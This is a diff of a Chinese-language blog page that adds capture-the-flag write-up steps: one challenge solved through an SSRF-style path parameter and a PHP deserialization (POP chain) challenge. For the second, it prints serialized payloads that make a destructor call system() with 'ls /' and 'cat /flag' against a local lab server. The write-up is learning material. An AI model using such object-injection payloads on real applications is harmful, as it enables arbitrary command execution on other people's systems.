@@ -336,14 +336,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2024-08-21
+                    2024-08-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    2.3k
+                    2.6k
                 </div>
                 
 
@@ -544,8 +544,15 @@
 <p>题目说在下面的文件里找flag，那么就开始吧</p>
 <img src="https://pic.imgdb.cn/item/66c5fc24d9c307b7e99580f1.png" style="zoom: 67%;">
 
+<p>点开链接一个一个找，果然也是没用的，但是url弹出了一个path的参数，让我想到了ssrf，那么就来一试</p>
+<img src="https://pic.imgdb.cn/item/66d0a45cd9c307b7e9811c41.png" style="zoom:50%;">
 
-
+<p>找到flag文件，但是打开没有flag，需要继续寻找</p>
+<p><img src="https://pic.imgdb.cn/item/66d0a4fad9c307b7e981ac14.png"></p>
+<p>最后在这个目录找到了</p>
+<p><img src="https://pic.imgdb.cn/item/66d0a58cd9c307b7e9824018.png"></p>
+<p>flag在此</p>
+<p><img src="https://pic.imgdb.cn/item/66d0a5b4d9c307b7e98263d6.png"></p>
 <h3 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h3><p><img src="https://pic.imgdb.cn/item/66c60073d9c307b7e9996ff6.png"></p>
 <img src="https://pic.imgdb.cn/item/66c600a0d9c307b7e9999cb9.png" style="zoom:67%;">
 
@@ -556,14 +563,20 @@
 <p>只能说，久违了SQL注入！</p>
 <h3 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h3><img src="https://pic.imgdb.cn/item/66c60402d9c307b7e9a3a44f.png" style="zoom:67%;">
 
+<p>很典型的一个pop链，开干，分析代码，可执行指令eval，$s执行eval</p>
+<p>传入data参数反序列化之后得到a，那么payload就应该将a序列化</p>
+<p>类 A中有属性a，并且有一个__destruct()函数，是在对象销毁时调用，也可以说创建对象之后，不用了销毁之后调用，那么就创建一个对象</p>
+<p>并且实例化一个对象后，a的值赋值给s，这意味着 $s变量所引用的值(也就是 this-&gt;a)将被作为一个函数或方法调用,并传入 this-&gt;evil作为参数</p>
+<p>我们可以使用 system 函数来执行任意的系统命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new A();  </span><br><span class="line">$a-&gt;evil = "ls /";  </span><br><span class="line">$a-&gt;a = "system";</span><br></pre></td></tr></tbody></table></figure>
 
+<p>那么构造payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:4:"ls /";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure>
 
+<p><img src="https://pic.imgdb.cn/item/66d0b8b0d9c307b7e99cd076.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:9:"cat /flag";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure>
 
-
-
-
-
-
+<p><img src="https://pic.imgdb.cn/item/66d0b8f8d9c307b7e99dab43.png">flag就出来了</p>
 <h3 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h3><p><img src="https://pic.imgdb.cn/item/66c210ccd9c307b7e9a29c35.png"></p>
 <p>好好好，什么都没有，查看了页面源代码，查看了检查，啥都没有</p>
 <p>直接扔到burpsuit里进行扫描，看看有没有其他目录和文件，然后真就有</p>
@@ -1135,7 +1148,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">32.4k</span>&nbsp;字
+                class="white-color">35.3k</span>&nbsp;字
             
             
             
